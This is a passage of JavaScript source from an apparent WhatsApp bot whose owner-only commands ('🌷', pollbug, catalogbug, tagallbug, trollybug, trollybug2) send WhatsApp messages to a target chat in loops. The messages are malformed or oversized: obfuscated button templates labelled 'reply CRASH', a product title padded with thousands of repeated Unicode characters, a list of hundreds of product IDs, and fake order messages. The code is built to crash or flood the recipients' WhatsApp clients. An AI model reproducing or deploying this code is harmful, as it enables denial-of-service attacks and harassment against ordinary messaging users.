                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
SkyzeeBOT.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
}
}
break
case '🌷':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Amount?\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await SkyzeeBOT[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
case 'tagallbug': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
let teks = `══✪〘 * TAGALL LMAO 🦄* 〙✪══
 ${themeemoji} *Message : ${q ? q : 'empty'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
SkyzeeBOT.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
}
break
case 'pollbug': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": ownername,
"options": [
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
SkyzeeBOT.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
xbug('Successful in sending the poll bug')
}
break

case 'catalogbug': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: SkyzeeBOT.waUploadToServer })
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `[⫹⫺ - 㑒 ${botname}]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
"description": wm,
"currencyCode": "INR",
"footerText": ownername,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": wm,
"url": websitex
},
"businessOwnerJid": "916909137213@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
SkyzeeBOT.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'trollybug2': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await SkyzeeBOT[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});SkyzeeBOT['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
}
}
break

case 'trollybug': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
a = await SkyzeeBOT.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${botname}`,jpegThumbnail: thumb}}}
var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": xpicvirus,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": ownername,
"orderTitle": wm, // 
"sellerJid": " 916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
SkyzeeBOT.relayMessage(m.chat, xeonoporwot.message, { messageId: xeonoporwot.key.id })
